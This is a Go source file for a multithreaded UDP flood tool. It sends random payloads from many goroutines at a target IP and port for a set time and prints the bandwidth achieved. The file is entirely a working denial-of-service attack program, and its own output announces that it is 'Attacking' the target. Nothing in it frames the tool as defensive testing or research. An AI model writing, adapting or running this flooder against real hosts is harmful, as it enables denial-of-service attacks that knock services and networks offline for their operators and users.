package main

import (
 "flag"
 "fmt"
 "math/rand"
 "net"
 "os"
 "os/signal"
 "runtime"
 "sync"
 "syscall"
 "time"
)

var (
 ip      = flag.String("ip", "", "Target IP")
 port    = flag.Int("port", 0, "Target port")
 size    = flag.Int("size", 1400, "Payload size")
 seconds = flag.Int("time", 10, "Duration in seconds")
 threads = flag.Int("threads", 200, "Number of threads")
)

var (
 byteCount uint64
 lock      sync.Mutex
)

func sendRawUDP(dstIP string, dstPort int, payload []byte, stopTime time.Time, wg *sync.WaitGroup) {
 defer wg.Done()

 addr := syscall.SockaddrInet4{Port: dstPort}
 copy(addr.Addr[:], net.ParseIP(dstIP).To4())

 fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
 if err != nil {
  fmt.Println("Socket error:", err)
  return
 }
 defer syscall.Close(fd)

 // Besarin buffer biar gak drop
 syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 4*1024*1024)

 for time.Now().Before(stopTime) {
  syscall.Sendto(fd, payload, 0, &addr)
  lock.Lock()
  byteCount += uint64(len(payload))
  lock.Unlock()
 }
}

func stats(duration time.Duration) {
 ticker := time.NewTicker(1 * time.Second)
 defer ticker.Stop()

 start := time.Now()
 var last uint64

 for range ticker.C {
  if time.Since(start) > duration {
   break
  }
  lock.Lock()
  curr := byteCount
  lock.Unlock()
  diff := curr - last
  last = curr
  fmt.Printf("[>] Speed: %.3f Gbps\n", float64(diff*8)/1e9)
 }
}

func main() {
 runtime.GOMAXPROCS(runtime.NumCPU())
 flag.Parse()

 if *ip == "" || *port == 0 {
  fmt.Println("Usage: ./udp_raw_gbps -ip <target_ip> -port <port> -size <bytes> -time <sec> -threads <num>")
  return
 }

 payload := make([]byte, *size)
 rand.Read(payload)

 stop := time.Now().Add(time.Duration(*seconds) * time.Second)
 var wg sync.WaitGroup

 fmt.Printf("[*] Attacking %s:%d with %d threads for %d seconds\n", *ip, *port, *threads, *seconds)

 go stats(time.Duration(*seconds) * time.Second)

 // Signal interrupt
 c := make(chan os.Signal, 1)
 signal.Notify(c, os.Interrupt)
 go func() {
  <-c
  fmt.Println("\n[!] Interrupted")
  os.Exit(1)
 }()

 for i := 0; i < *threads; i++ {
  wg.Add(1)
  go sendRawUDP(*ip, *port, payload, stop, &wg)
 }

 wg.Wait()

 lock.Lock()
 total := byteCount
 lock.Unlock()

 fmt.Printf("[✓] Done. Sent total %.2f GB\n", float64(total)/1e9)
}
